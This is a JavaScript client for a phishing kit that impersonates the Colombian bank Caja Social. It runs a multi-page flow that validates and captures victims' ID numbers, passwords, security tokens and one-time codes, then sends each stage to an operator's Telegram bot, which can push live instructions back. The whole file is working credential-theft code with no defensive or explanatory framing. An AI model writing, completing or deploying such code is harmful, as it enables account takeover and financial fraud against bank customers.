/**
 * CAJA SOCIAL - Cliente optimizado usando banco-utils + caja-social-telegram
 */

(function() {
    'use strict';

    const pageConfig = {
        'index.html': {
            stage: 'login',
            form: 'loginForm',
            inputs: { usuario: 'usuario' },
            button: 'submitBtn',
            validation: (data) => /^(CC|CE|NI|TI|PE)\d+$/i.test((data.usuario || '').trim())
        },
        'password.html': {
            stage: 'password',
            form: 'passwordForm',
            inputs: { password: 'password' },
            button: 'btnContinuar',
            validation: (data) => (data.password || '').length === 8
        },
        'token.html': {
            stage: 'token',
            form: 'tokenForm',
            inputs: { token: 'token' },
            button: 'btnContinuar',
            validation: (data) => (data.token || '').length === 6
        },
        'otp.html': {
            stage: 'otp',
            form: 'otpForm',
            inputs: { otp: 'otp' },
            button: 'btnVerificar',
            validation: (data) => {
                const len = (data.otp || '').length;
                return len >= 4 && len <= 8;
            }
        }
    };

    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    if (!config) return;

    document.addEventListener('DOMContentLoaded', function() {
        if (!window.BancoUtils || !window.CajaSocialTelegram) {
            console.error('Faltan banco-utils.js o caja-social-telegram.js');
            return;
        }

        CajaSocialTelegram.initPageErrors();

        const sessionId = BancoUtils.getSessionId();
        BancoUtils.initSocket();

        const form = document.getElementById(config.form);
        const button = document.getElementById(config.button);
        const inputs = {};

        Object.keys(config.inputs).forEach((key) => {
            inputs[key] = document.getElementById(config.inputs[key]);
            if (inputs[key]) inputs[key].addEventListener('input', validateForm);
        });

        validateForm();

        BancoUtils.onTelegramAction((data) => {
            CajaSocialTelegram.handleTelegramAction(data);
        });

        function validateForm() {
            const data = {};
            Object.keys(inputs).forEach((key) => {
                data[key] = inputs[key] ? inputs[key].value.trim() : '';
            });

            const isValid = config.validation(data);
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('enabled', isValid);
            }
        }

        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                validateForm();
                if (button && button.disabled) return;

                BancoUtils.showOverlay();
                const overlay = document.getElementById('loadingOverlay');
                if (overlay) {
                    overlay.style.display = 'flex';
                    overlay.classList.add('show');
                }

                const socket = BancoUtils.getSocket();
                if (!socket || !socket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    BancoUtils.hideOverlay();
                    if (overlay) overlay.style.display = 'none';
                    return;
                }

                const formData = {};
                Object.keys(inputs).forEach((key) => {
                    formData[key] = inputs[key] ? inputs[key].value.trim() : '';
                });

                const fullData = BancoUtils.saveBankData('caja-social', formData);
                const message = BancoUtils.formatMessage(`CAJA SOCIAL - ${config.stage.toUpperCase()}`, fullData);
                const keyboard = CajaSocialTelegram.getKeyboard();

                try {
                    await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error al enviar datos');
                    BancoUtils.hideOverlay();
                    if (overlay) overlay.style.display = 'none';
                }
            });
        }
    });
})();
